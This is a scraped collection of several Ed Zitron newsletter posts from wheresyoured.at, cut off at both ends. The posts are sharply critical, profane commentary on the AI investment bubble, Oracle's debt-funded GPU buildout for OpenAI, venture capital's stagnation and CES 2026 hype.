written. Make Fun Of Them , the piece that restarted my fire after a bit of a low point, where I call for a radical new approach to tech CEOs: mocking them, because they talk like idiots and provide little value to society outside of their dedication to shareholder value. The Hater's Guide To The AI Bubble , a piece that elevated me in a way that I never expected, a thorough and brutal broadside against an industry that has no profits and terrible costs, discussing how generative AI is nothing like Uber or Amazon Web Services, there are no profitable generative AI companies, agents do not and cannot exist, there is no AI SaaS story, and everything rides - and dies - on selling GPUs. AI Is A Money Trap , a piece about how AI companies' ridiculous valuations and unsustainable businesses make exits or IPOs impossible, how data center developers have no exit route, and US economic growth has become shouldered entirely by big tech. How To Argue With An AI Booster , a comprehensive guide to arguing with AI boosters, addressing both their bad faith debate style and their specific (and flimsy) arguments as to why generative AI is the future. The Case Against Generative AI , a comprehensive analysis of a financial collapse built on myths, the markets\u2019 unhealthy obsession with NVIDIA's growth, and the fact that there is not enough money in the world to fund OpenAI. NVIDIA Isn't Enron, So What Is It? - A lighthearted and indepth analysis of NVIDIA as a company, a historic rundown of what happened with Lucent, WorldCom and Enron, as well as a guide to how it makes money, how its future relies on endless debt, how millions of GPUs are sitting waiting to be installed, and why it no longer makes sense to buy more GPUs. The Enshittifinancial Crisis , a piece about The Enshittifinancial Crisis, the fourth stage of enshittification, where companies turn on their shareholders. Unprofitable, unsustainable AI threatens future of venture capital, private equity and the markets themselves. I published two massive exclusives: How Much Anthropic and Cursor Spend On Amazon Web Services , which is exactly what it sounds like. How Much OpenAI Spends On Inference and Its Revenue Share With Microsoft , which also includes evidence that OpenAI's revenues were at around $4.5 billion by the end of September, a vast difference from the $4.3 billion for the first half of the year published by other outlets. The Financial Times , The Register and TechCrunch covered, while others aggressively ignored it. I launched the premium edition of my newsletter, and published multiple deeply important pieces of research: The Hater's Guide to NVIDIA , the single-most exhaustive rundown of the rickety nature of the company sitting at the top of the stock market \u2013  how its future is dependent on massive debt, how AI revenues will never pay back the cost of these GPUs, and how there are likely millions of GPUs sitting in warehouses, as there's no chance that 6 million Blackwell GPUs have actually been installed and turned on. Published November 24 2025, I made this call several weeks before famed short seller Michael Burry would do the same . How Does GPT-5 Work? - an exclusive piece (reported using internal documents from an infrastructure provider) on how GPT-5's router mode actually costs OpenAI more money to run. OpenAI Burned $4.1 Billion More Than We Knew - Where Is Its Money Going? - an analysis of reported cash burn and investments in OpenAI that proved the company burned more than $4 billion more than we know. OpenAI and Oracle Are Full of Crap - on September 12 2025, months before anybody started worrying about it, I published proof that OpenAI couldn't afford to pay Oracle and Oracle didn't have the capacity to service their farcical $300 billion, 5-year-long deal . OpenAI Needs A Trillion Dollars In The Next Four Years - on September 26 2025, I published a thorough review and analysis of OpenAI's agreed-upon compute and data center deals, and proved that it needed at least $1 trillion in the next four years to pull any of it off, several weeks before anyone else did . The Hater's Guide To The AI Bubble Volume 2 : a massive omnibus summary of every major AI company's weaknesses - the pathetic revenues, terrible margins and horrifying costs, and how hopeless everything feels. I also did no less than 50 different interviews, with highlights including: My own interview in the New Yorker's legendary \"Talk Of The Town\" section . Profiles with Slate , the Financial Times and FastCompany . An interview with MarketWatch about The Hater's Guide to the AI Bubble . A panel in Seattle with Cory Doctorow about Enshittification and The Rot Economy . A chat with Brooke Gladstone on NPR about the AI bubble . Two interviews with the BBC. An interview with Van Lathan and Rachel Lindsay on The Ringer's Higher Learning . Two episodes of Chapo Trap House. Interviews with The Lever , Parker Molloy's The Present Age , Bloomberg's Everybody's Business , The Majority Report , Newsweek's 1600 Podcast , TechCrunch , Defector , the New Yorker (by the legendary Cal Newport) , Guy Kawasaki's Remarkable People , both Slate's Death, Sex &amp; Money and the excellent TBD podcast , TrashFuture multiple times, The Times Radio (I think multiple times?) and NPR Marketplace . Citations in an astonishing amount of major media outlets, with highlights including The Economist , The Guardian , Charlie Brooker (!) in The Hollywood Reporter , ArsTechnica , CNN , Semafor and ZDNet Next year I will be finishing up my book Why Everything Stopped Working (due out in 2027), and continuing to dig into the nightmare of corporate finance I've found myself in the center of. I have no idea what happens next. My fear - and expectation - is that many people still do not realize that there is an AI bubble or will not accept how significant and dangerous the bubble is, meaning that everybody is going to act like AI is the biggest most hugest and most special thing in the world right up until they accept that it isn't. I will always cover tech, but I get the sense I'll be looking into other things next year - private equity, for one - that have caught my eye toward the end of the year. I realize right now everything feels a little intense and bleak, but at this time of year it's always worth remembering to be kinder and more thoughtful toward those close to us. It's cheesy, but it's the best thing you can possibly do. It's easy to feel isolated by the amount of hogs oinking at the prospect of laying you off or replacing you - and it turns out there are far more people that are afraid or outraged than there are executives or AI boosters. Never forget (or forgive them for) what they've done to the computer, and never forget that those scorned by the AI bubble are legion. Join me on r/Betteroffline , you are far from alone. I intend to spend the next year becoming a better writer, analyst, broadcaster, entertainer and person. I appreciate every single one of you that reads my work, and hope you'll continue to do so in the future. See you in 2026, Ed Zitron ez@betteroffline.com '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:57:16</p>"},{"location":"wheresyoured.at/Premium-%20The%20AI%20Bubble%20Is%20A%20Time%20Bomb_20260123/","title":"Premium: The AI Bubble Is A Time Bomb","text":"<p>\u6765\u6e90: wheresyoured.at \u53d1\u5e03\u65f6\u95f4: Fri, 23 Jan 2026 17:57:18 GMT \u94fe\u63a5: https://www.wheresyoured.at/premium-timebomb/</p> <p>Log in Subscribe Premium: The AI Bubble Is A Time Bomb Edward Zitron Jan 23, 2026 56 min read Table of Contents Read the full story Sign up now to read the full story and get access to all posts for paying subscribers only. Subscribe Already have an account? Sign in Welcome to Where's Your Ed At! Subscribe today. It's free. Please. Subscribe Great! Check your inbox and click the link. Sorry, something went wrong. Please try again. Great! You\u2019ve successfully signed up. Welcome back! You've successfully signed in. You've successfully subscribed to Ed Zitron's Where's Your Ed At. Your link has expired. Success! Check your email for magic link to sign-in. Success! Your billing info has been updated. Your billing was not updated.</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:57:13</p>"},{"location":"wheresyoured.at/Premium-%20The%20Hater%27s%20Guide%20to%20Oracle_20260130/","title":"Premium: The Hater's Guide to Oracle","text":"<p>\u6765\u6e90: wheresyoured.at \u53d1\u5e03\u65f6\u95f4: Fri, 30 Jan 2026 17:23:06 GMT \u94fe\u63a5: https://www.wheresyoured.at/haters-guide-oracle/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' You can\u2019t avoid Oracle. No, really, you can\u2019t. Oracle is everywhere. It sells ERP software \u2013 enterprise resource planning, which is a rat king of different services for giant companies for financial services, procurement (IE: sourcing and organizing the goods your company needs to run), compliance, project management, and human resources. It sells database software, and even owns the programming language Java as part of its acquisition of Sun Microsystems back in 2010 . Its customers are fucking everyone: hospitals ( such as England\u2019s National Health Service ), large corporations (like Microsoft), health insurance companies, Walmart, and multiple different governments. Even if you have never even heard of Oracle before, it\u2019s almost entirely certain that your personal data is sitting in an Oracle-designed system somewhere. Once you let Oracle into your house, it never leaves. Canceling contracts is difficult, to the point that one Redditor notes that some clients agreed to spend a minimum amount of money on services without realizing, meaning that you can\u2019t remove services you don\u2019t need even during the renewal of a contract . One user from three years ago told the story of adding two users to their contract for Oracle\u2019s Netsuite Starter Edition ( around $1000 a month in today\u2019s pricing ), only for an Oracle account manager to call a day later to demand they upgrade to the more expensive package ($2500 per month) for every user. In a thread from a year ago , another user asked for help renegotiating their contract for Netsuite, adding that \u201c[their] company is no where near the state needed to begin an implementation\u201d and \u201cwould use a third party partner to implement\u201d software that they had been sold by Oracle. One user responded by saying that Oracle would play hardball and \u201cmay even use [the] threat of attorneys.\u201d In fact, there are entire websites about negotiations with Oracle, with Palisade Compliance saying that \u201cOracle likes a frenetic pace where contracts are reviewed and dialogues happen under the constant pressure of Oracle\u2019s quarter closes,\u201d describing negotiations with them as \u201coften rushed, filled with tension, and littered with threats from aggressive sales and Oracle auditing personnel.\u201d This is something you can only do when you\u2019ve made it so incredibly difficult to change providers. What\u2019re you gonna do? Have your entire database not work? Pay up. Oracle also likes to do \u201caudits\u201d of big customers where it makes sure that every single part of your organization that uses Oracle software is paying for it, or were not using it in a way that was not allowed based on their contract . For example, Oracle sued healthcare IT company Perry Johnson &amp; Associates in 2020 because the company that built PJ&amp;A\u2019s database systems used Oracle\u2019s database software. The case was settled. This is all to say that Oracle is a big company that sells lots of stuff, and increases the pressure around its quarterly earnings as a means of boosting revenues. If you have a company with computers that might be running Java or Oracle\u2019s software \u2014 even if somebody else installed it for you! \u2014 you\u2019ll be paying Oracle, one way or another. They even tried to sue Google for using the open source version of Java to build its Android operating system (though they lost). Oracle is a huge, inevitable pain in the ass, and, for the most part, an incredibly profitable one . Every time a new customer signs on at Oracle, they pledge themselves to the Graveyard Smash and permanent fealty to Larry Ellison\u2019s database empire. As a result, founder Larry Ellison has become one of the richest people in the world \u2014 the fifth-largest as of writing this sentence \u2014 owning 40% of Oracle\u2019s stock and, per Martin Peers of The Information, will earn about $2.3 billion in dividends in the next year. Oracle has also done well to stay out of bullshit hype-cycles. While it quickly spun up vague blockchain and metaverse offerings, its capex stayed relatively flat at around $1 billion to $2.1 billion a fiscal year (which runs from June 1 to May 31), until it burst to $4.511 in FY2022 (which began on June 1, 2021, for reference), $8.695 billion in FY2023, $6.86 billion in FY2024, and then increasing a teeny little bit to $21.25 billion in FY2025 as it stocked up on AI GPUs and started selling compute. You may be wondering if that helped at all, and it doesn\u2019t appear to have at all. Oracle\u2019s net income has stayed in the $2 billion to $3 billion range for over a decade , other than a $2.7 billion spike last quarter from its sale of its shares in Ampere . You see, things have gotten weird at Oracle, in part because of the weirdness of the Ellisons themselves, and their cozy relationship with the Trump Administration ( and Trump itself ). Ellison\u2019s massive wealth backed son David Ellison\u2019s acquisition of Paramount , putting conservative Bari Weiss at the helm of CBS in an attempt to placate and empower the right wing, and is currently trying to buy Warner Brothers Discovery ( though it appears Netflix may have won ), all in pursuit of kissing up to a regime steeped in brutality and bigotry that killed two people in Minnesota. As part of the media blitz, the Ellisons also took part in the acquisition of TikTok, and last week established a joint venture that owns TikTok\u2019s US operations , with Oracle owning 15% of the new company (along with VC Silverlake and the UAE\u2019s MGXs fund). Per TechCrunch: Oracle will serve as the trusted security partner, responsible for auditing and ensuring compliance with National Security Terms, according to a memo. The company already provides cloud services for TikTok and manages user data in the U.S. Notably, Oracle previously made a bid for TikTok back in 2020. I know that you\u2019re likely a little scared that an ultra right-wing billionaire has bought another major social network. I know you think that Oracle, a massive and inevitable cloud storage platform owned by a man who looks like H.R. Giger drew Jerry Stiller. I know you\u2019re likely worried about a replay of the Elon Musk Twitter fiasco, where every week it seemed like things would collapse but it never seemed to happen, and then Musk bought an election. What if I told you that things were very different, and far more existentially perilous for Oracle? Oracle Is Burning Billions of Dollars, Threatening Its Future and Larry Ellison\u2019s Fortune You see, Oracle is arguably one of the single-most evil and successful companies in the world, and it\u2019s got there by being an aggressive vendor of database and ERP software, one that, like a tick with a law degree, cannot be removed without some degree of bloodshed. Perhaps not the highest-margin business in the world, but you know, it worked. Oracle has stuck to the things it\u2019s known for for years and years and done just fine\u2026 \u2026until AI, that is. Let\u2019s see what AI has done for Oracle\u2019s gross margi- OH MY GOD ! The scourge of AI GPUs has taken Oracle\u2019s gross margin from around 79% in 2021 to 68.54% in 2025, with CNBC reporting that FactSet-polled analysts saw it falling to 49% by 2030 , which I think is actually being a little optimistic. Oracle was very early to high-performance computing, becoming the first cloud in the world to have general availability of NVIDIA\u2019s A100 GPUs back in September 2020 , and in June 2023 (at the beginning of Oracle\u2019s FY2024), Ellison declared that Oracle would spend \u201cbillions\u201d on NVIDIA GPUs, naming AI firm Cohere as one of its customers. In May 2024, Musk and Ellison discussed a massive cloud compute contract \u2014 a multi-year, $10 billion deal that fell apart in July 2024 when Musk got impatient , a blow that was softened by Microsoft\u2019s deal to buy compute capacity for OpenAI , for chips to be rented out of a data center in Abilene Texas that, about six months later, OpenAI would claim was part of a \u201c$500 billion Stargate initiative\u201d announcement between Oracle, SoftBank and OpenAI that was so rushed that Ellison had to borrow a coat to stay warm on the White House lawn, per The Information . \u201cStargate\u201d is commonly misunderstood as a Trump program, or something that has raised $500 billion, when what it actually is is Oracle raising debt to build data centers for OpenAI. Instead of staying in its lane as a dystopian datacenter mobster, Oracle entered into negative-to-extremely-low margin realm of GPU rentals, raising $58 billion in debt and signing $248 billion in data center leases to service a 5-year-long $300 billion contract with OpenAI that it doesn\u2019t have the capacity for and OpenAI doesn\u2019t have the money to pay for . Oh, and TikTok? The billion-user social network that Oracle sort-of-just bought? There\u2019s one little problem with it: per The Information , ByteDance investors estimate TikTok lost several billion dollars last year on revenues of roughly $20 billion, attributed to its high growth costs and, per The Information, \u201chigher operational and labor costs in overseas markets compared to China.\u201d Now, I know what you\u2019re gonna say: Ellison bought TikTok as a propaganda tool, much like Musk bought Twitter. \u201cThe plan isn\u2019t for it to be profitable,\u201d you say. \u201cIt\u2019s all about control\u201d you say, and I say, in response, that you should know exactly how fucked Oracle is. In its last quarter, Oracle had negative $13 billion in cash flow , and between 2022 and late 2025 quintupled its PP&amp;E (from $12.8 billion to $67.85 billion), primarily through the acquisition of GPUs for AI compute. Its remaining performance obligations are $523 billion , with $300 billion of that coming from OpenAI in a deal that starts, according to the Wall Street Journal, \u201c in 2027 ,\u201d with data centers that are so behind in construction that the best Oracle could muster is saying that 96,000 B200 GPUs had been \u201cdelivered\u201d to the Stargate Abilene data center in December 2025 for a data center of 450,000 GPUs that has to be fully operational by the end of 2026 without fail. And what\u2019re the margins on those GPUs? Negative 100% . Oracle, a business borne of soulless capitalist brutality, has tied itself existentially to not just the success of AI , but the specific, incredible, impossible success of OpenAI , which will have to muster up $30 billion in less than a year to start paying for it, and another $270 billion or more to pay for the rest\u2026 at a time when Oracle doesn\u2019t have the capacity and has taken on brutal debt to build it. For Oracle to survive , OpenAI must find a way to pay it four times the annual revenue of Microsoft Azure ($75 billion) , and because OpenAI burns billions of dollars, it\u2019s going to have to raise all of that money at a time of historically low liquidity for venture capital . Did I mention that Oracle took on $56 billion of debt to build data centers specifically for OpenAI? Or that the banks who invested in these deals don\u2019t seem to be able to sell off the debt ? Let me put it really simply: Larry Ellison\u2019s wealth is almost entirely tied up in Oracle stock. Oracle\u2019s stock is tied to the company \u201cOracle,\u201d which is currently destroying its margins and annihilating its available cash to buy GPUs to serve a customer that cannot afford to pay it. Oracle has taken on ruinous debt that can only be paid if this customer, which cannot afford it and needs to raise money from an already-depleted venture capital pool, actually pays it. Oracle\u2019s stock has already been punished for these debts , and that\u2019s before OpenAI fails to pay for its contract. Oracle now owns part of one of its largest cloud customers, TikTok, which loses billions of dollars a year, and the US entity says, per Bloomberg , that it will \u201cretrain, test and update the content recommendation algorithm on US user data,\u201d guaranteeing that it\u2019ll fuck up whatever makes it useful, reducing its efficacy for advertisers. Larry Ellison\u2019s entire financial future is based on whether OpenAI lives or dies. If it dies, there isn\u2019t another entity in the universe that can actually afford (or has interest in) the scale of the compute Oracle is building. We are setting up for a very funny and chaotic situation where Oracle simply runs out of money, and in the process blows up Larry Ellison\u2019s fortune. However much influence Ellison might have with the administration, Oracle has burdened itself with debt and $248 billion in data center lease obligations \u2014 costs that are inevitable, and are already crushing the life out of the company (and the stock). The only way out is if OpenAI becomes literally the most-successful cash-generating company of all time within the next two years, and that\u2019s being generous. This is not a joke. This is not an understatement. Sam Altman holds Larry Ellison\u2019s future in his clammy little hands, and there isn\u2019t really anything anybody can do about it other than hope for the best, because Oracle already took on all that debt and capex. Forget about politics, forget about the fear in your heart that the darkness always wins, and join me in The Hater\u2019s Guide To Oracle, or My Name\u2019s Larry Ellison, and Welcome To Jackass. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:57:11</p>"},{"location":"wheresyoured.at/Premium-%20This%20Is%20Worse%20Than%20The%20Dot%20Com%20Bubble_20260116/","title":"Premium: This Is Worse Than The Dot Com Bubble","text":"<p>\u6765\u6e90: wheresyoured.at \u53d1\u5e03\u65f6\u95f4: Fri, 16 Jan 2026 17:15:37 GMT \u94fe\u63a5: https://www.wheresyoured.at/dot-com-bubble/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' Soundtrack - Radiohead - Karma Police I just spent a week at the Consumer Electronics Show, and one word kept coming up: bullshit. LG, a company known for making home appliances and televisions, demonstrated a robot (named \u201cCLOiD\u201d for some reason) that could \u201cfold laundry\u201d (extremely slowly, in limited circumstances, and even then it sometimes failed) or cook (by which I mean put things in an oven that opened automatically) or find your keys (in a video demo), one that it has no intention of releasing. The media generally gave it an easy go, with one reporter suggesting that a barely-functioning tech demo somehow \u201c marked a turning point \u201d because LG was now \u201centering the robotics space\u201d with a product it had no intention of selling. So, why did LG demo the robot? To con the media and investors, of course! Hundreds of other companies demoed other robots you couldn\u2019t buy, and despite what reports might say, we were not shown \u201c the future of robotics \u201d in any meaningful sense. We got to see what happens when companies run out of ideas and can only copy each other. CES 2026 was the \u201cyear of robotics\u201d in the same way that somebody is a sailor because they wore a captain\u2019s hat while sitting in a cardboard box. Yet the robotics companies were surprisingly ethical compared to the nonsensical tide of LLM-driven wank, from no-name dregs in the basement of the Venetian Expo Center to companies like Lenovo warbling about its \u201c AI super agent .\u201d In fact, fuck it, let\u2019s talk about that. \u201cAI is evolving and getting new capabilities, sensing our three-dimensional world, understanding how things move and connect,\u201d said Lenovo CEO Yang Yuanqing , leading into a demo of Lenovo Qira, before claiming it \u201credefines what it means to have technology built around you.\u201d One would think the demo that follows would be an incredible demonstration of futuristic technology. Instead, a spokesperson walked up, asked Qira to show what it could see (IE: multimodal capabilities available for years in many models), received a summary of notifications (available in effectively any LLM integration, and incredibly prone to hallucinations), and asked \u201cwhat to get her kids when she had some free time,\u201d at which point Qira told her, and I quote, that \u201cthe Las Vegas Fashion Mall has some Labubus that children will go crazy for,\u201d referring to the kind of tool-based web search that\u2019s been available since 2024. The presenter noted that Qira also can add reminders \u2014 something that has been available for years on most iOS or Android devices \u2014 and search for documents, then showed a proof-of-concept wearable that can record and transcribe meetings, a product that I saw no less than seven times during my time at CES. Lenovo rented out the entirety of the Las Vegas Sphere to do a demonstration of a fucking chatbot powered by OpenAI\u2019s models on Microsoft Azure , and everybody acted like it was something new. No, Qira is not a \u201c big bet \u201d on AI \u2014 it\u2019s a fucking chatbot forced on anybody buying a Lenovo PC, full of features like \u201csummarize this\u201d or \u201ctranscribe this\u201d or \u201ctell me what\u2019s on my calendar,\u201d features peddled by business idiots that have little experience with any real-world applications of just about anything , marketed with the knowledge that the media will do the hard work of explaining why anybody should give a shit. Want better-looking video or audio from your TV? Get fucked! You\u2019re getting nano banana image generation from Google and other LLM features from Samsung You can now generate images on your TV using Google\u2019s Nano Banana model \u2014 a useless idea peddled by a company that doesn\u2019t know what consumers actually want, varnished as making your TV-based assistant \u201c more helpful and more visually engaging .\u201d As David Katzmaier correctly said, nobody asked for LLMs in their TVs , allowing you to \u201cclick to search\u201d something that\u2019s on your TV, something that no normal person will do. In fact, most of the show felt like companies doing madlibs with startup decks to try and trick people into thinking they\u2019d done anything other than staple a frontend on top of a Large Language Model. Nowhere was that more obvious than the glut of useless AI-powered \u201csmart\u201d glasses , all of which claim to do translation, or dictation, or run \u201capps\u201d using clunky, ugly and hard-to-use interfaces, all using the same LLMs, all doing effectively the same thing. These products only exist because Meta decided to blow several billion dollars on launching \u201c AI glasses ,\u201d with the slew of copycats phrased as being \u201cpart of a new category\u201d rather than \u201ca bunch of companies making a bunch of useless bullshit nobody wants or needs.\u201d These are not the actions of companies that truly fear missing the mark, let alone the judgment of the media, analysts or investors. These are the actions of a tech industry that has escaped any meaningful criticism \u2014 let alone regulation! \u2014 of their core businesses or new products under the auspices of \u201cgiving them a chance\u201d or \u201cbeing open to new ideas,\u201d and those ideas are always whatever the tech industry just said, even if it\u2019s nonsensical. When Facebook announced it was changing its name to Meta as a means of pursuing \u201c the successor to the mobile internet ,\u201d it didn\u2019t really provide any proof beyond a series of extremely shitty VR apps , but not to worry, Casey Newton of Platformer was there to tell us that Facebook was going to \u201cstrive to build a maximalist, interconnected set of experiences straight out of sci-fi \u2014 a world known as the metaverse,\u201d adding that the metaverse was \u201chaving a moment.\u201d Similarly, Futurum Group\u2019s Dan Newman said in April 2022 that \u201cthe metaverse was coming\u201d and that it \u201cwould likely continue to be one of the biggest trends for years to come.\u201d Three years and $70 billion later , the metaverse is dead, and everybody acts as if it didn\u2019t happen. Whoops! In a sane society, investors, analysts and the media would never trust a single word out of Mark Zuckerberg\u2019s mouth ever again. Instead, the media gleefully covered his mid-2025 \u201c Personal Superintelligence \u201d blog where he promised everybody would have a \u201cpersonal superintelligence\u201d to \u201chelp you achieve your goals.\u201d Do LLMs do that? No. Can they ever do that? No. Doesn\u2019t matter! This is the tech industry. There is no punishment, no consequence, no critique, no cynicism, and no comeuppance \u2014 only celebration and consideration, only growth. All the while, the largest tech firms have continued growing, always finding new ways (largely through aggressive monopolies and massive sales teams) to make Number Go Up to the point that the media, analysts and investors have stopped asking any challenging questions, and naturally assumed that they \u2014 and the financiers that back them \u2014 would never do something really stupid. The tech, business and finance media had been well-trained at this point to understand that progress was always the story, and that failure was somehow \u201cnecessary for innovation,\u201d whether or not anything was innovative. Over time, this created an evolutionary problem. The successes of companies like Uber \u2014 which grew to quasi-profitability after more than a decade of burning billions of dollars \u2014 convinced journalists that startups had to burn tons of money to grow . All that it took to convince some members of the media that something was a good idea was $50 million or more in funding, with larger funding rounds making it \u2014 for whatever reason \u2014 less palatable to critique a company, for fear that you would \u201cbet against a winner,\u201d as the assumption would be that this company would go public or get acquired, and nobody wants to be wrong , do they? This naturally created a world of startup investment and innovation that oriented itself around the growth-at-all-costs nightmare of The Rot Economy . Startups were rewarded not for creating real businesses, or having good ideas, or even creating new categories, but for their ability to play \u201c brainwash a venture capitalist ,\u201d either through being \u201ca founder to bet on\u201d or appealing to the next bazillion-dollar TAM boondoggle. Perhaps they\u2019d find some sort of product-market fit, or grow a large audience by providing a service at an unsustainable cost, but this was all done with the knowledge of an upcoming bailout via IPO or acquisition. The Stagnation of Venture Capital Over the years, venture capital was rewarded for funding \u201cbig ideas\u201d and that, for the most part, paid off. Eventually those \u201cbig ideas\u201d stopped being \u201cbig ideas for necessary companies\u201d and became \u201cbig ideas for growing as fast as possible and dumping onto the public markets or other companies afraid that they\u2019d be left behind.\u201d Taking a company public used to be easy[ From 2015-2019, there were over 100 IPOs annually , with a consistent flow of M&amp;A giving startups somewhere to sell themselves, leading up to the egregious excess of the frothy M&amp;A and IPO market of 2021 (a year that also saw $643 billion in venture capital investment ), which led to 311 IPOs that shed 60% of their value by October 2023 . Years of stupid bets based on the assumption that the markets or big tech would buy any company that remotely scared them piled up. This created the current liquidity crisis in venture capital, where funds raised after 2018 have struggled to return any investor money , making investing in venture capital firms less lucrative, which in turn made raising money from Limited Partners harder, which in turn led to less money being available for startups that were now paying higher rates as SaaS companies \u2014 some of whom were startups \u2014 gouged their customers with higher rates every year . Every single one of these problems comes down to one simple thing: growth. Limited Partners invest in venture capitalists that can show growth, and venture capital invested in companies that would show growth, which would in turn increase their value, which would allow them to sell for a greater amount of money. The media covers companies based not on what they do but their potential value , a value that\u2019s largely dictated by the vibes of the company and the amount of money that they\u2019ve raised from investors. And all of that only makes sense if there\u2019s liquidity, and based on the overall TVPI (the amount of money you made for each dollar invested) of funds raised after 2018 , the majority of VC firms have not been able to actually make their investors more than even money in years. Why? Because they invested in bullshit. It\u2019s that simple. The companies they invested in are dogs that will never go public or sell to another company. While many people believe that venture capital is about making early, risky bets on vestigial companies, the truth is that the majority of venture dollars go into late-stage bets . A kinder person would frame this as \u201cdoubling down on established companies,\u201d but those of us living in reality see it for what it is \u2014 a culture that has more in common with investing in penny stocks than it does in understanding any business fundamentals. Perhaps I\u2019m a little bit naive, but my perception of venture capital was that it was about discovering nascent technologies and giving them the means to make their ideas a reality. The risk was that these companies were early and thus might die , but those that didn\u2019t die would soar. Instead, Silicon Valley waits for angel and seed investors to take the risk first, reads TechCrunch, watches the ( Well Well Well, If It Isn\u2019t The ) Technology Brothers , or browses Twitter all day and discovers the next thing to pile into. The problem with a system like this is that it naturally rewards grifting, and it was inevitable that a kind of technology would come along that worked against a system that had chased out any good sense or independent thought. Generative AI lowers the barrier of entry for anybody to cobble together a startup that can say all the right things to a venture capitalist. Vibe coding can create a \u201cworking prototype\u201d of a product that can\u2019t scale (but can raise money!), the nebulous problems of LLMs \u2014 their voracious need for data, the massive data security issues, and so on \u2014 offer founders the chance to create slews of nebulous \u201cobservability\u201d and \u201cdata veracity\u201d companies, and the burdensome cost of running anything LLM-adjacent means that venture capitalists can make huge bets on companies with inflated valuations, allowing them to raise the Net Asset Value of their holdings arbitrarily as other desperate investors pile into later rounds. As a result, AI startups took up 65% of all venture capital funding in Q4 2025 . Venture capital\u2019s fundamental disconnection from value-creation (or reality) has led to hundreds of billions of dollars flowing into AI startups that have already-negative margins that get worse as their customer base grows and the cost of inference (creating outputs) is increasing , and at this point it\u2019s obvious that it is impossible to create a foundation lab or LLM-powered service that makes a profit, on top of the fact that it appears that renting the GPUs for AI services is also unprofitable. I also need to be clear that this is far, far worse than the dot com bubble. US venture capital invested $11.49 billion ($23.08bn in today\u2019s money) in 1997, $14.27 billion ($28.21 billion in today\u2019s money) in 1998 , $48.3 billion ($95.50 billion in today\u2019s money) in 1999 , and over $100 billion ($197.71 billion) in 2000 for a grand total of $344.49 billion (in today\u2019s money) \u2014 a mere $6.174 billion more than the $338.3 billion raised in 2025 alone , with somewhere between 40% and 50% of that (around $168 billion) going into AI investments, and in 2024, North American AI startups raised around $106 billion . According to the New York Times , \u201c48 percent of dot-com companies founded since 1996 were still around in late 2004, more than four years after the Nasdaq\u2019s peak in March 2000.\u201d The ones that folded were predominantly dodgy and nakedly unsustainable eCommerce shops like WebVan ( $393m in venture capital), Pets.com ( $15m ) and Kozmo ( $233m ), all of which filed to go public, though Kozmo failed to dump itself onto the markets in time . Yet in a very real sense, the \u201cdot com bubble\u201d that everybody experienced had very little to do with actual technology. Investors in the public markets rushed with their eyes closed and their wallets out to invest in any company that even smelled like the computer, leading to basically any major tech or telecommunications stock trading at a ridiculous multiple of their earnings per share ( 60x in Microsoft\u2019s case ). The bubble burst when the bullshit dot-com stocks died on their ass and the world realized that the magic of the internet was not a panacea that would fix every business model, and there was no magic moment where a company like WebVan or Pets.com would turn a horribly-unprofitable business into a real one. Similarly, companies like Lucent Technologies stopped being rewarded for doing dodgy, circular deals with companies like Winstar , leading to the collapse of the telecommunications bubble that led to millions of miles of dark fiber being sold dirt cheap in 2002. The oversupply of dark fiber was eventually seen as a positive , leading to an eventual surge in demand as billions of people came online toward the end of the 2000s. Now, I know what you\u2019re thinking. Ed, isn\u2019t that exactly what\u2019s happening here? We\u2019ve got overvalued startups, we\u2019ve got multiple unprofitable, unsustainable AI companies promising to IPO , we\u2019ve got overvalued tech stocks, and we\u2019ve got one of the largest infrastructural buildouts of all time. Tech companies are trading at ridiculous multiples of their earnings-per-share, but the multiples aren\u2019t as high . That\u2019s good, right? No. No it isn\u2019t. AI boosters and well-wishers are obsessed with making this comparison because saying \u201cthings worked out after the dot com bubble\u201d allows them to rationalize doing stupid, destructive and reckless things. Even if this was just like the dot com bubble, things would be absolutely fucking catastrophic \u2014 the NASDAQ dropped 78% from its peak in March 2000 \u2014 but due to the incredible ignorance of both the private and public power brokers of the tech industry, I expect consequences that range from calamitous to catastrophic, dependent almost entirely on how long the bubble takes to burst, and how willing the SEC is to greenlight an IPO. The AI bubble bursting will be worse, because the investments are larger, the contagion is wider, and the underlying asset \u2014 GPUs \u2014 are entirely different in their costs, utility and basic value than dark fiber. Furthermore, the basic unit economics of AI \u2014 both in its infrastructure and the AI companies themselves \u2014 are magnitudes more horrifying than anything we saw in the dot com bubble. In simpler terms, I\u2019m really fucking worried, and I\u2019m sick and tired of hearing people making this comparison. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:57:14</p>"},{"location":"wheresyoured.at/The%20Enshittifinancial%20Crisis_20251229/","title":"The Enshittifinancial Crisis","text":"<p>\u6765\u6e90: wheresyoured.at \u53d1\u5e03\u65f6\u95f4: Mon, 29 Dec 2025 16:57:06 GMT \u94fe\u63a5: https://www.wheresyoured.at/the-enshittifinancial-crisis/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' Soundtrack: Lynyrd Skynyrd \u2014 Free Bird This piece is over 19,000 words, and took me a great deal of writing and research. If you liked it, please subscribe to my premium newsletter. It\u2019s $70 a year, or $7 a month, and in return you get a weekly newsletter that\u2019s usually anywhere from 5000 to 15,000 words, including vast, extremely detailed analyses of NVIDIA , Anthropic and OpenAI\u2019s finances , and the AI bubble writ large . I am regularly several steps ahead in my coverage, and you get an absolute ton of value. In the bottom right hand corner of your screen you\u2019ll see a red circle \u2014 click that and select either monthly or annual.\u00a0 Next year I expect to expand to other areas too. It\u2019ll be great. You\u2019re gonna love it. If you have any issues signing up for premium, please email me at ez@betteroffline.com. OpenAI told me opex keep eating his revenues, so I asked how many rounds of private equity he has burned and he said he just goes to the market and gets new equity afterwards so I said it sounds like he's just feeding equity to opex and then Sam Altman started crying \u2014 @FraPippo428 One time, a good friend of mine told me that the more I learned about finance, the more pissed off I\u2019d get. He was right. There is an echoing melancholy to this era, as we watch the end of Silicon Valley\u2019s hypergrowth era, the horrifying result of 15+ years of steering the tech industry away from solving actual problems in pursuit of eternal growth. Everything is more expensive, and every tech product has gotten worse, all so that every company can \u201cdo AI,\u201d whatever the fuck that means. We are watching one of the greatest wastes of money in history, all as people are told that there \u201cjust isn\u2019t the money\u201d to build things like housing, or provide Americans with universal healthcare, or better schools, or create the means for the average person to accumulate wealth. The money does exist, it just exists for those who want to gamble \u2014 private equity firms, \u201c business development companies 